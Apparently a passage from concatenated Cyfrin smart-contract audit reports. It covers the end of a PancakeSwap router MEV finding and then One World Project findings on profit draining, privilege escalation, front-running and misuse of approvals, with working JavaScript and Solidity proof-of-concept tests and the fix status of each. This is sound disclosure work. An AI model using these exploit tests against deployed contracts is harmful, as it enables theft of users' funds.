    returns (uint256 weth_usdc_ratio, uint256 cake_busdc_ratio, uint256 usdc_busdc_ratio) {
        bytes[] memory inputsHelperUser = new bytes[](2);
        //@audit => swap 1 WBNB for USDC to get an approximate of the current conversion between WBNB to USDC
        inputsHelperUser[0] = abi.encode(ActionConstants.MSG_SENDER, 1e18, 0, pathSwap1, true);
        //@audit => swap 1 CAKE for BUSDC to get an approximate of the current conversion between CAKE to BUSDC
        inputsHelperUser[1] = abi.encode(ActionConstants.MSG_SENDER, 1e18, 0, pathSwap2, true);

        bytes memory commandsHelperUser = abi.encodePacked(bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.V2_SWAP_EXACT_IN)));
        vm.prank(helperUser);
        router.execute(commandsHelperUser, inputsHelperUser);

        weth_usdc_ratio = USDC.balanceOf(address(helperUser));
        cake_busdc_ratio = BUSDC.balanceOf(address(helperUser));
        console.log("Convertion between WBNB to USDC:" , weth_usdc_ratio);
        console.log("Convertion between CAKE to BUSDC:" , cake_busdc_ratio);

        uint256 usdcUserHelperBalance = USDC.balanceOf(address(helperUser));
        uint256 busdcUserHelperBalanceBeforeStableSwap = BUSDC.balanceOf(address(helperUser));
        bytes[] memory inputsStableSwapHelperUser = new bytes[](1);
        //@audit => swap USDC for 1 BUSDC to get an approximate of the current conversion between USDC to BUSDC
        inputsStableSwapHelperUser[0] = abi.encode(ActionConstants.MSG_SENDER, 1e18, 0, stableSwapPath, pairFlag, true);

        bytes memory commandsStableSwapHelperUser = abi.encodePacked(bytes1(uint8(Commands.STABLE_SWAP_EXACT_IN)));
        vm.prank(helperUser);
        router.execute(commandsStableSwapHelperUser, inputsStableSwapHelperUser);

        usdc_busdc_ratio = BUSDC.balanceOf(address(helperUser)) - busdcUserHelperBalanceBeforeStableSwap;
        console.log("Convertion between USDC to BUSDC:" , usdc_busdc_ratio);
    }
}
```

There are two tests on the above PoC.
- The first test (`test_happyPathWithoutAbusingBug`) demonstrates the amount of tokenOut (BUSDC) the user should receive for swapping 1 WBNB and 250 CAKE.
    - In total, the user should receive > 1250 BUSDC.

- The second test (`test_explotingLackOfMevProtection`) demonstrates how an attacker is able to steal from the user when swapping on the StablePool.
    - The user receives < 675 BUSDC for swapping 1WBNB and 250 CAKE (same as the first test).

Run the tests with the next commands:
- Test1: `forge test --match-test test_happyPathWithoutAbusingBug -vvvv`
- Test2: `forge test --match-test test_explotingLackOfMevProtection -vvvv`

**Recommended Mitigation:** Consider checking the balance of tokenOut that the Router is holding before doing the stableSwap, and compare this with the balance after the swap is completed. Compute the difference and validate that such a difference is at least the specified `amountOutMinimum` to receive on that swap.

 **Pancake Swap**
Fixed in [PR 22](https://github.com/pancakeswap/pancake-v4-universal-router/pull/22/commits/0d4e1e9c61232edede18d07dde574954f20a064a#diff-4db526cf07a2465a36dea10866e1b87c8dc08ab7af4804b87e90a4cbd66c092a)

**Cyfrin:** Verified. Fixed as recommended.

\clearpage
## Informational


### Incorrect test setup in StableSwap.t.sol

**Description:** `StableSwap.t.sol` contains tests where the payer is the router contract itself. In all such cases the `payerIsUser` is incorrectly set to `true`. Even with an incorrect setup, these tests are passing because the test contract has enough balance of `token0` and `token1`.

**Recommended Mitigation:** Consider updating the `payerIsUser` flag to false in the following tests:
`test_stableSwap_exactInput0For1FromRouter`
`test_stableSwap_exactInput1For0FromRouter`
`test_stableSwap_exactOutput0For1FromRouter`
`test_stableSwap_exactOutput1For0FromRouter`

**Pancake Swap**
Fixed in [PR 22](https://github.com/pancakeswap/pancake-v4-universal-router/pull/22/commits/f8c2797af283e35002fc3d8cb0c97b453348a8f1)

**Cyfrin:** Verified. Fixed as recommended.


### Incorrect configuration of `StableInfo` contract address in BSC Testnet

**Description:** For BSC Testnet deployment, the router setup parameters for both the `StableFactory` and `StableInfo` contracts are configured to use the same address: 0xe6A00f8b819244e8Ab9Ea930e46449C2F20B6609. This is likely an oversight, as these should typically be separate contracts with distinct addresses.

**Recommended Mitigation:** Consider using the correct deployment address for `StableInfo`contract.

**Pancake Swap**
Fixed in [PR 22](https://github.com/pancakeswap/pancake-v4-universal-router/pull/22/commits/2d02a0afeeb1b8facd17e376aeb7f4326bb1be68)

**Cyfrin:** Verified.


### When executing multiple commands, StablePool `exactOutput` swaps may fail for ERC20 tokens with self-transfer restrictions

**Description:** Multi-step swaps on StablePools can revert the whole transaction for tokens that don't allow self-transfers.

Swapping exactOutput on a StablePool when the `payer` is set as the router (`address(this)`) (for example, when doing a multi-step swap and the router already has the `tokenIn` for the swap), can cause the transaction to revert for tokens that reverts on self-transfer.

**Recommended Mitigation:** Consider skipping the self-transfer when `payer == address(this)`.

```solidity
function stableSwapExactOutput(
    ...
) internal {


-   payOrPermit2Transfer(path[0], payer, address(this), amountIn);
+  if (payer != address(this)) payOrPermit2Transfer(path[0], payer, address(this), amountIn);

    ...
}
```

**Pancake Swap**
Acknowledged.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2024-10-07-cyfrin-pancakeswap-v2.0.md ------


------ FILE START car/reports_md/2024-10-29-cyfrin-one-world-project-v2.0.md ------

**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)

[Gio](https://twitter.com/giovannidisiena)

**Assisting Auditors**



---

# Findings
## Critical Risk


### `MembershipERC1155` profit tokens can be drained due to missing `lastProfit` synchronization when minting and claiming profit

**Description:** When [`MembershipERC1155:claimProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L138-L147) is called by a DAO member, the [`lastProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L184) mapping is updated to keep track of their claimed rewards; however, this state is not synchronized when minting/burning membership tokens or when transferring membership tokens to a new account.

Hence, when minting or transferring, a new user will be considered eligible for a share of previous profit from before they were a DAO member. Aside from the obvious case where a new DAO member claims profits at the expense of other existing members, this can be weaponized by recycling the same membership token between fresh accounts and claiming until the profit token balance of the `MembershipERC1155Contract` has been drained.

**Impact:** DAO members can claim profits to which they should not be entitled and malicious users can drain the `MembershipERC1155` contract of all profit tokens (including those from membership fees if paid in the same currency).

**Proof of Concept:** The following tests can be added to `describe("Profit Sharing")` in `MembershipERC1155.test.ts`:
```javascript
it("lets users steal steal account balance by transferring tokens and claiming profit", async function () {
    await membershipERC1155.connect(deployer).mint(user.address, 1, 100);
    await membershipERC1155.connect(deployer).mint(anotherUser.address, 1, 100);
    await testERC20.mint(nonAdmin.address, ethers.utils.parseEther("20"));
    await testERC20.connect(nonAdmin).approve(membershipERC1155.address, ethers.utils.parseEther("20"));
    await membershipERC1155.connect(nonAdmin).sendProfit(testERC20.address, ethers.utils.parseEther("2"));
    const userProfit = await membershipERC1155.profitOf(user.address, testERC20.address);
    expect(userProfit).to.be.equal(ethers.utils.parseEther("1"));

    const beforeBalance = await testERC20.balanceOf(user.address);
    const initialContractBalance = await testERC20.balanceOf(membershipERC1155.address);

    // user claims profit
    await membershipERC1155.connect(user).claimProfit(testERC20.address);

    const afterBalance = await testERC20.balanceOf(user.address);
    const contractBalance = await testERC20.balanceOf(membershipERC1155.address);

    // users balance increased
    expect(afterBalance.sub(beforeBalance)).to.equal(userProfit);
    expect(contractBalance).to.equal(initialContractBalance.sub(userProfit));

    // user creates a second account and transfers their tokens to it
    const userSecondAccount = (await ethers.getSigners())[4];
    await membershipERC1155.connect(user).safeTransferFrom(user.address, userSecondAccount.address, 1, 100, '0x');
    const newProfit = await membershipERC1155.profitOf(userSecondAccount.address, testERC20.address);
    expect(newProfit).to.be.equal(userProfit);

    // second account can claim profit
    const newBeforeBalance = await testERC20.balanceOf(userSecondAccount.address);
    await membershipERC1155.connect(userSecondAccount).claimProfit(testERC20.address);
    const newAfterBalance = await testERC20.balanceOf(userSecondAccount.address);
    expect(newAfterBalance.sub(newBeforeBalance)).to.equal(newProfit);

    // contract balance has decreased with twice the profit
    const contractBalanceAfter = await testERC20.balanceOf(membershipERC1155.address);
    expect(contractBalanceAfter).to.equal(initialContractBalance.sub(userProfit.mul(2)));
    expect(contractBalanceAfter).to.equal(0);

    // no profit left for other users
    const anotherUserProfit = await membershipERC1155.profitOf(anotherUser.address, testERC20.address);
    expect(anotherUserProfit).to.be.equal(ethers.utils.parseEther("1"));
    await expect(membershipERC1155.connect(anotherUser).claimProfit(testERC20.address)).to.be.revertedWith("ERC20: transfer amount exceeds balance");
});

it("lets users steal steal account balance by minting after profit is sent", async function () {
    await membershipERC1155.connect(deployer).mint(user.address, 1, 100);
    await membershipERC1155.connect(deployer).mint(anotherUser.address, 1, 100);
    await testERC20.mint(nonAdmin.address, ethers.utils.parseEther("20"));
    await testERC20.connect(nonAdmin).approve(membershipERC1155.address, ethers.utils.parseEther("20"));
    await membershipERC1155.connect(nonAdmin).sendProfit(testERC20.address, ethers.utils.parseEther("2"));
    const userProfit = await membershipERC1155.profitOf(user.address, testERC20.address);
    expect(userProfit).to.be.equal(ethers.utils.parseEther("1"));

    const beforeBalance = await testERC20.balanceOf(user.address);
    const initialContractBalance = await testERC20.balanceOf(membershipERC1155.address);

    // user claims profit
    await membershipERC1155.connect(user).claimProfit(testERC20.address);

    const afterBalance = await testERC20.balanceOf(user.address);
    const contractBalance = await testERC20.balanceOf(membershipERC1155.address);

    // users balance increased
    expect(afterBalance.sub(beforeBalance)).to.equal(userProfit);
    expect(contractBalance).to.equal(initialContractBalance.sub(userProfit));

    // new user mints a token after profit and can claim first users profit
    const newUser = (await ethers.getSigners())[4];
    await membershipERC1155.connect(deployer).mint(newUser.address, 1, 100);
    const newProfit = await membershipERC1155.profitOf(newUser.address, testERC20.address);
    expect(newProfit).to.be.equal(ethers.utils.parseEther("1"));

    // new user can claim profit
    const newBeforeBalance = await testERC20.balanceOf(newUser.address);
    await membershipERC1155.connect(newUser).claimProfit(testERC20.address);
    const newAfterBalance = await testERC20.balanceOf(newUser.address);
    expect(newAfterBalance.sub(newBeforeBalance)).to.equal(newProfit);

    // contract balance has decreased with twice the profit
    const contractBalanceAfter = await testERC20.balanceOf(membershipERC1155.address);
    expect(contractBalanceAfter).to.equal(initialContractBalance.sub(userProfit.mul(2)));
    expect(contractBalanceAfter).to.equal(0);

    // no profit left for first users
    const anotherUserProfit = await membershipERC1155.profitOf(anotherUser.address, testERC20.address);
    expect(anotherUserProfit).to.be.equal(ethers.utils.parseEther("1"));
    await expect(membershipERC1155.connect(anotherUser).claimProfit(testERC20.address)).to.be.revertedWith("ERC20: transfer amount exceeds balance");
});
```

**Recommended Mitigation:** Consider overriding `ERC1155::_beforeTokenTransfer` to take a snapshot of the profit state whenever relevant actions are performed.

**One World Project:** Updated code structure, removed redundant code. Updated rewards on token transfers in [`a3980c1`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/a3980c17217a0b65ecbd28eb078d4d94b4bd5b80) and [`a836386`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/a836386bd48691078435d10df5671e3c25f23719)

**Cyfrin:** Verified. Rewards are now updated in the `ERC1155Upgradeable::_update` which will apply to all movement of tokens.


### DAO creator can inflate their privileges to mint/burn membership tokens, steal profits, and abuse approvals to `MembershipERC1155`

**Description:** During the [creation of a new DAO](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L66-L70), the `MembershipFactory` contract is [granted](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L49) the `OWP_FACTORY_ROLE` which has special privileges to [mint](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L52-L59)/[burn](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L61-L67) tokens and execute any arbitrary call via [`MembershipERC1155::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L202-L210). Additionally, the calling account is [granted](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L48) the `DEFAULT_ADMIN_ROLE`; however, as [documented](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/49c0e4370d0cc50ea6090709e3835a3091e33ee2/contracts/access/AccessControl.sol#L40-L48), this bestows the power to manage all other roles as well.

This means that the creator of a given DAO can grant themselves the `OWP_FACTORY_ROLE` by calling `AccessControl::grantRole` and has a number of implications:
- Profit tokens can be stolen from callers of [`MembershipERC1155:sendProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L189-L200), either by front-running and/or abusing dangling approvals.
- The DAO creator has unilateral control of the DAO and its membership tokens, so can mint/burn to/from any address.
- Profit can be stolen from the DAO by front-running a call to `MembershipERC1155::sendProfit` with a call to [`MembershipERC1155::burnBatchMultiple`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L85-L99) to ensure that [this conditional block](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L198-L200) is executed by causing the total supply of membership tokens to become zero. Alternatively, they can wait for the call to be executed and transfer the tokens directly using the arbitrary external call.

```solidity
if (_totalSupply > 0) {
    totalProfit[currency] += (amount * ACCURACY) / _totalSupply;
    IERC20(currency).safeTransferFrom(msg.sender, address(this), amount);
    emit Profit(amount);
} else {
    IERC20(currency).safeTransferFrom(msg.sender, creator, amount); // Redirect profit to creator if no supply
}
```

It is also prescient to note that this issue exists in isolation as a centralization risk of the One World Project owner itself, as detailed in a separate finding, who controls the `MembershipFactory` contract and thus all DAOs via [`MembershipFactory::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L155-L163).

**Impact:** The creator of a DAO can escalate their privileges to have unilateral control and steal profits from its members, as well as abusing any profit token approvals to the contract. All of the above is also possible for the One World Project owner, who has control of the factory and thus all DAOs created by it.

**Proof of Concept:** The following test can be added to `describe("ERC1155 and AccessControl Interface Support")` in `MembershipERC1155.test.ts`:
```javascript
it("can give OWP_FACTORY_ROLE to an address and abuse priviliges", async function () {
    const [factory, creator, user] = await ethers.getSigners();
    const membership = await MembershipERC1155.connect(factory).deploy();
    await membership.deployed();
    await membership.initialize("TestToken", "TST", tokenURI, creator.address);

    await membership.connect(creator).grantRole(await membership.OWP_FACTORY_ROLE(), creator.address);
    expect(await membership.hasRole(await membership.OWP_FACTORY_ROLE(), creator.address)).to.be.true;

    // creator can mint and burn at will
    await membership.connect(creator).mint(user.address, 1, 100);
    await membership.connect(creator).burn(user.address, 1, 50);

    await testERC20.mint(user.address, ethers.utils.parseEther("1"));
    await testERC20.connect(user).approve(membership.address, ethers.utils.parseEther("1"));

    const creatorBalanceBefore = await testERC20.balanceOf(creator.address);

    // creator can abuse approvals
    const data = testERC20.interface.encodeFunctionData("transferFrom", [user.address, creator.address, ethers.utils.parseEther("1")]);
    await membership.connect(creator).callExternalContract(testERC20.address, data);

    const creatorBalanceAfter = await testERC20.balanceOf(creator.address);
    expect(creatorBalanceAfter.sub(creatorBalanceBefore)).to.equal(ethers.utils.parseEther("1"));
});
```

**Recommended Mitigation:** Implement more fine-grained access controls for the DAO creator instead of granting the `DEFAULT_ADMIN_ROLE`.

**One World Project:** Given a separate role to the creator in [`a6b9d82`](https://github.com/OneWpOrg/smart-contracts-blockchain-1wp/commit/a6b9d82796c2d87a3924e8e80c3732474bf22506).

**Cyfrin:** Verified. `creator` now has a separate role `DAO_CREATOR ` that can only change URI.

\clearpage
## High Risk


### `MembershipERC1155::sendProfit` can be front-run by calls to `MembershipFactory::joinDAO` to steal profit from existing DAO members

**Description:** Profit is distributed to DAO members following a call to [`MembershipERC1155::sendProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L189-L201) which increases the profit per share tracked in [`totalProfit`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L195). Due to the absence of any sort of profit-sharing delay upon joining the DAO, another user with sufficient financial motivation could see this transaction and buy up a large stake in the DAO before it is executed. This would entitle them to a claim on the newly-added profits at the expense of existing DAO members.

**Impact:** Calls to `MembershipERC1155::sendProfit` can be front-run, unfairly decreasing the profit paid out to existing DAO members.

**Proof of Concept:** The following test can be added to  `describe("Join DAO")` in `MembershipFactory.test.ts`:
```javascript
it("lets users front-run profit distribution", async function () {
  const tierIndex = 0;
  await testERC20.mint(addr1.address, ethers.utils.parseEther("1"));
  await testERC20.connect(addr1).approve(membershipFactory.address, TierConfig[tierIndex].price);
  await testERC20.mint(addr2.address, ethers.utils.parseEther("1"));
  await testERC20.connect(addr2).approve(membershipFactory.address, ethers.utils.parseEther("1"));
  await testERC20.mint(owner.address, ethers.utils.parseEther("1"));
  await testERC20.connect(owner).approve(membershipERC1155.address, ethers.utils.parseEther("1"));
  // user1 joins
  await membershipFactory.connect(addr1).joinDAO(membershipERC1155.address, tierIndex);

  // time passes

  // user2 sees a pending sendProfit tx and front-runs it by buying a lot of membership tokens
  // this can be done with a deployed contract
  for(let i = 0; i < 9; i++) {
    await membershipFactory.connect(addr2).joinDAO(membershipERC1155.address, tierIndex);
  }

  // send profit tx is executed
  await membershipERC1155.sendProfit(testERC20.address, ethers.utils.parseEther("1"));

  const addr1Profit = await membershipERC1155.profitOf(addr1.address, testERC20.address);
  const addr2Profit = await membershipERC1155.profitOf(addr2.address, testERC20.address);

  // user2 has gotten 9x the profit of user1
  expect(addr1Profit).to.equal(ethers.utils.parseEther("0.1"));
  expect(addr2Profit).to.equal(ethers.utils.parseEther("0.9"));
});
```

**Recommended Mitigation:** Consider implementing a membership delay, after which profit sharing is activated.

**One World Project:** Membership must be purchased, and if a user wishes to acquire a significant number of shares to potentially front-run the sendProfit function, they would need to spend a much larger amount than the profit they would gain.

**Cyfrin:** Acknowledged. However, since the One World Project neither controls the distribution of profits nor the timing of user participation, it cannot enforce limitations that would prevent a scenario where the financial incentives exceed the cost of membership entry. In cases where the profit distribution is significant, the situation could become financially viable for participants, even if unintended. As the protocol does not have control over these variables, it cannot prevent a DAO from inadvertently creating this scenario. Therefore, we recommend that the One World Project clearly communicate this potential risk in its documentation during the onboarding of new DAOs.


### One World Project has unilateral control over all DAOs, allowing the owner to update tier configurations, mint/burn membership tokens, steal profits, and abuse token approvals to `MembershipFactory` and `MembershipERC1155` proxy contracts

**Description:** When the `MembershipFactory` contract is deployed, the `EXTERNAL_CALLER` role is granted to the caller. This allows the One World Project to update the tiers configurations for a specific DAO via [`MembershipFactory::updateDAOMembership`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L90-L117) and execute any arbitrary call via [`MembershipFactory::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L155-L163). Additionally, during the [creation of a new DAO](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L66-L70), the `MembershipFactory` contract is [granted](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L49) the `OWP_FACTORY_ROLE` which has special privileges to [mint](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L52-L59)/[burn](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L61-L67) tokens and execute any arbitrary call via [`MembershipERC1155::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L202-L210).

While unilateral control over DAO tier configurations alone is prescient to note, the chaining of `MembershipFactory::callExternalContract` and `MembershipERC1155::callExternalContract` calls is incredibly dangerous without any restrictions on the target function selectors and contracts to be called. As a consequence, similar to the other privilege escalation vulnerability, the One World Project owner has the ability to arbitrarily mint/burn membership tokens for all DAOs, steal profits, and abuse approvals to `MembershipERC1155` proxy contracts. Furthermore, `MembershipFactory::callExternalContract` can be used to abuse approvals given to this contract directly, by front-running or otherwise  if a user sets the maximum `uint256` allowance on joining a DAO, the One World Project owner could drain their entire token balance for the given currency.

**Impact:** The One World Project owner has unilateral control of the `MembershipFactory` contract and thus all DAOs created by it, meaning profits can be stolen from its members and profit token approvals to the proxy contracts abused. The One World Project owner could also drain the balances of any tokens with dangling approvals to the `MembershipFactory` contract. This is especially problematic if the owner address becomes compromised in any way.

**Proof of Concept:** The following test can be added to `describe("Call External Contract")` in `MembershipFactory.test.ts`:
```javascript
it("allows admin to have unilateral power", async function() {
  await testERC20.mint(addr1.address, ethers.utils.parseEther("2"));
  await testERC20.connect(addr1).approve(membershipFactory.address, ethers.utils.parseEther("1"));

  await currencyManager.addCurrency(testERC20.address);  // Assume addCurrency function exists in CurrencyManager
  const tx = await membershipFactory.createNewDAOMembership(DAOConfig, TierConfig);
  const receipt = await tx.wait();
  const event = receipt.events.find((event:any) => event.event === "MembershipDAONFTCreated");
  const nftAddress = event.args[1];
  const membershipERC1155 = await MembershipERC1155.attach(nftAddress);

  let ownerBalanceBefore = await testERC20.balanceOf(owner.address);

  // admin can steal approvals made to factory
  const transferData = testERC20.interface.encodeFunctionData("transferFrom", [addr1.address, owner.address, ethers.utils.parseEther("1")]);
  await membershipFactory.callExternalContract(testERC20.address, transferData);

  let ownerBalanceAfter = await testERC20.balanceOf(owner.address);
  expect(ownerBalanceAfter.sub(ownerBalanceBefore)).to.equal(ethers.utils.parseEther("1"));

  // admin can mint/burn any DAO membership tokens
  const mintData = membershipERC1155.interface.encodeFunctionData("mint", [owner.address, 1, 100]);
  await membershipFactory.callExternalContract(nftAddress, mintData);

  let ownerBalanceERC1155 = await membershipERC1155.balanceOf(owner.address, 1);
  expect(ownerBalanceERC1155).to.equal(100);

  const burnData = membershipERC1155.interface.encodeFunctionData("burn", [owner.address, 1, 50]);
  await membershipFactory.callExternalContract(nftAddress, burnData);

  ownerBalanceERC1155 = await membershipERC1155.balanceOf(owner.address, 1);
  expect(ownerBalanceERC1155).to.equal(50);

  // admin can abuse approvals to any membership tokens as well
  await testERC20.connect(addr1).approve(membershipERC1155.address, ethers.utils.parseEther("1"));

  ownerBalanceBefore = await testERC20.balanceOf(owner.address);

  const data = membershipERC1155.interface.encodeFunctionData("callExternalContract", [testERC20.address, transferData]);
  await membershipFactory.callExternalContract(membershipERC1155.address, data);

  ownerBalanceAfter = await testERC20.balanceOf(owner.address);
  expect(ownerBalanceAfter.sub(ownerBalanceBefore)).to.equal(ethers.utils.parseEther("1"));
});
```

**Recommended Mitigation:** Implement restrictions on the target contracts and function selectors to be invoked by the arbitrary external calls to prevent abuse of the `MembershipFactory` contract ownership.

**One World Project:** The `EXTERNAL_CALLER` wallet is securely stored in AWS Secrets Manager in the backend, with no access granted to any individual. This wallet is necessary to execute on-chain transactions for off-chain processes. Further the executable functions are not defined to specific function-signatures, because in future this contract may be required to interact with contracts to distribute funds to projects or perform other tasks through the DAO, by executing through off-chain approvals

**Cyfrin:** Acknowledged. While AWS Secrets Manager adds security, private key or API key leaks remain a risk.

\clearpage
## Medium Risk


### DAO name can be stolen by front-running calls to `MembershipFactory::createNewDAOMembership`

**Description:** When `MembershipFactory::createNewDAOMembership` is called, the newly created `MembershipERC1155` instance it is [associated](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L61) with a name, `ensname`:

```solidity
require(getENSAddress[daoConfig.ensname] == address(0), "DAO already exist.");
```

However, this call can be front-run by a malicious user who sees that another creator is setting up a One World Project membership token and "steals" their name by registering the same name before them.

**Impact:** Anyone can front-run the creation of a DAO membership. This could be used for creating honey pots or just to grief the DAO creator.

**Recommended Mitigation:** Consider validating that the DAO creator is associated with the corresponding ENS name. Alternatively, allow the name to be any string and use a concatenation of the creator and name as a key.

**One World Project:** The DAO name is not necessarily an ENS name, and can be any string. If any name is not available the dao creator is made aware in the frontend website beforehand, and they are free to choose any other name or variation of that name. The name is kept in string format to help the dao creators identify/remember their daos easily without have to remember any ids

If someone is able to create a DAO with that name before you then they are allowed to, and the user would have to choose a different name or variation for their DAO. It is solely up to the DAO creators to decide the DAO names however they like.

**Cyfrin:** Acknowledged.


### DAO membership fees cannot be retrieved by the creator

**Description:** The DAO membership fee taken from users who invoke [`MembershipFactory::joinDAO`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L120-L133) is split between the One World Project and the DAO creator, being sent to the One World Project wallet and DAO `MembershipERC1155` instance respectively:

```solidity
uint256 tierPrice = daos[daoMembershipAddress].tiers[tierIndex].price;
uint256 platformFees = (20 * tierPrice) / 100;
daos[daoMembershipAddress].tiers[tierIndex].minted += 1;
IERC20(daos[daoMembershipAddress].currency).transferFrom(msg.sender, owpWallet, platformFees);
IERC20(daos[daoMembershipAddress].currency).transferFrom(msg.sender, daoMembershipAddress, tierPrice - platformFees);
```

However, the fees [sent](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L130) to the `daoMembershipAddress` are not accessible to the DAO creator as there is no method for direct retrieval. The only way these funds can be retrieved and sent to the creator is if the `MembershipFactory::EXTERNAL_CALLER` role invokes [`MembershipERC1155::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/tokens/MembershipERC1155.sol#L202-L210) via [`MembershipFactory::callExternalContract`](https://github.com/OneWpOrg/audit-2024-10-oneworld/blob/416630e46ea6f0e9bd9bdd0aea6a48119d0b515a/contracts/dao/MembershipFactory.sol#L155-L163), allowing arbitrary external calls to be executed.

**Impact:** The DAO creator has no direct method for retrieving the membership fees paid to their `MembershipERC1155` instance, ignoring rescue initiated by the `EXTERNAL_CALLER` role.

**Proof of Concept:** The following test can be added to `describe("Create New DAO Membership")` in `MembershipFactory.test.ts`:
```javascript
it("only allows owner to recover dao membership fees", async function () {
  await currencyManager.addCurrency(testERC20.address);
  const creator = addr1;

  await membershipFactory.connect(creator).createNewDAOMembership(DAOConfig, TierConfig);

  const ensAddress = await membershipFactory.getENSAddress("testdao.eth");
  const membershipERC1155 = await MembershipERC1155.attach(ensAddress);

  await testERC20.mint(addr2.address, ethers.utils.parseEther("20"));
  await testERC20.connect(addr2).approve(membershipFactory.address, ethers.utils.parseEther("20"));
  await expect(membershipFactory.connect(addr2).joinDAO(membershipERC1155.address, 1)).to.not.be.reverted;

  // fees are in the membership token but cannot be retrieved by the creator
  const daoMembershipBalance = await testERC20.balanceOf(membershipERC1155.address);
  expect(daoMembershipBalance).to.equal(160); // minus protocol fee

  const creatorBalanceBefore = await testERC20.balanceOf(creator.address);

  // only admin can recover them
  const transferData = testERC20.interface.encodeFunctionData("transfer", [creator.address, 160]);
  const data = membershipERC1155.interface.encodeFunctionData("callExternalContract", [testERC20.address, transferData]);
  await membershipFactory.callExternalContract(membershipERC1155.address, data);

  const creatorBalanceAfter = await testERC20.balanceOf(creator.address);
  expect(creatorBalanceAfter.sub(creatorBalanceBefore)).to.equal(160);
});
```

**Recommended Mitigation:** Consider adding a method for the creator of the DAO to retrieve the membership fees paid by users upon joining the DAO.

**One World Project:** The DAO creator is deliberately, by design, not allowed to access the DAO funds. They have to be accessed through the `callExternalContract` which can only be called by the `EXTERNAL_CONTRACT` which does its own verifications in the backend.

**Cyfrin:** Acknowledged. This dependency introduces additional risks, and we recommend ensuring the off-chain service meets stringent security standards.


### Meta transactions do not work with most of the calls in `MembershipFactory`

**Description:** `MembershipFactory` uses a custom meta transactions implementation by inheriting `NativeMetaTransaction` which allow a relayer to pay the transaction fees on behalf of a user. This is achieved by following the same standard as ERC2771, where the user signs a transaction that is forwarded by a relayer and executed with the signing user's address appended to the `msg.data`.

